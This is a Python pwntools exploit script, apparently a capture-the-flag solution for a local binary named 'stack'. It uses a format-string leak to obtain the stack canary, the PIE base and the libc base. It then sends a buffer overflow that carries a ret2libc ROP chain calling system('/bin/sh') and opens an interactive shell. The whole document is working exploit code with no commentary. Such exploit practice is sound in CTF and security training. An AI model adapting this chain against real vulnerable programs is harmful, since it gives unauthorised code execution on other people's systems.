from pwn import * 

p = process("./stack") 


print(p.recvline())
print(p.recvuntil(b":"))
p.sendline(b"%75$p%91$p%93$p")

main_off = 0x11ea

off = 264 

data = p.recvline()[:-1].split(b':')[1]
print("[DATA]" , data)

main , canary ,libc_base= int(b'0x'+data.split(b"0x")[1],16) , int(b"0x"+data.split(b"0x")[2],16), int(b"0x"+data.split(b"0x")[3],16)
libc_base -= 0x29d8a
print("[MAIN]" , hex(main))
print("[CANARY]" , hex(canary))
print("[LIBC]",hex(libc_base))


pie_base = main - main_off
print("[PIE]" , hex(pie_base))

off = 264 

ret = pie_base + 0x101a 

binsh = libc_base+0x19de28
system = libc_base+0x51c30
poprdi = libc_base+0x2a265

p.sendline(b'A' * off + p64(canary) + b'A'*8 + p64(ret)+ p64(poprdi) + p64(binsh) + p64(system)) 

p.interactive()